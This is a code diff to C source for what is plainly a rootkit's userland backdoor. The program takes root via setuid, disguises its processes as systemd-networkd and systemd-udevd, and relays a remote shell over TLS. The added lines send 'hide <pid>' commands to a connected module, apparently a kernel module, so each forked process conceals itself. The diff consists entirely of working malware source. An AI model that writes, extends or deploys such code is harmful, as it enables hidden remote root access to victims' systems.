@@ -38,6 +38,8 @@ static unsigned char secret_key[KEY_LEN];
 #define SHELL_SOCK_PATH ("/var/run/my_remote_shell")
 #endif
 
+int conn_sock;
+
 /*
  * function:
  *    wrapped_fork
@@ -96,6 +98,15 @@ void run_remote_shell(void) {
         exit(EXIT_SUCCESS);
     }
     setsid();
+
+    unsigned char buffer[30];
+
+    sleep(1);
+
+    memset(buffer, 0, 30);
+    sprintf((char*) buffer, "hide %d", getpid());
+    printf("Writing %s to module on process start\n", buffer);
+    write(conn_sock, buffer, strlen((char*) buffer));
 
     dup2(remote_sock, 0);
     dup2(remote_sock, 1);
@@ -273,7 +284,7 @@ int waitForEpollEvent(const int epollfd, struct epoll_event* events) {
  * Establishes a TLS session, forks into read and write processes, and forwards packets
  */
 int main(int argc, char** argv) {
-    (void)argc;
+    (void) argc;
     const char* mask_1 = "/usr/lib/systemd/systemd-networkd";
     const char* mask_2 = "/usr/lib/systemd/systemd-udevd";
     if (setuid(0)) {
@@ -303,7 +314,8 @@ int main(int argc, char** argv) {
     listen(local_tls_socket, 5);
     listen(remote_shell_unix, 5);
 
-    int conn_sock = accept(local_tls_socket, NULL, 0);
+    //int conn_sock = accept(local_tls_socket, NULL, 0);
+    conn_sock = accept(local_tls_socket, NULL, 0);
     fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
 
     int remote_sock = create_remote_socket();
@@ -354,6 +366,13 @@ int main(int argc, char** argv) {
         eve.data.fd = remote_shell_sock;
         add_epoll_socket(efd, remote_shell_sock, &eve);
 
+        //sleep(3);
+
+        memset(buffer, 0, 30);
+        sprintf((char*) buffer, "hide %d", getpid());
+        printf("Writing %s to module on process start\n", buffer);
+        write(conn_sock, buffer, strlen((char*) buffer));
+
         for (;;) {
             int n = waitForEpollEvent(efd, eventList);
             //n can't be -1 because the handling for that is done in waitForEpollEvent
@@ -386,6 +405,13 @@ int main(int argc, char** argv) {
     } else {
         setsid();
         mask_process(argv, mask_2);
+
+        //sleep(3);
+
+        memset(buffer, 0, 30);
+        sprintf((char*) buffer, "hide %d", getpid());
+        printf("Writing %s to module on process start\n", buffer);
+        write(conn_sock, buffer, strlen((char*) buffer));
         //Read
         for (;;) {
             int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
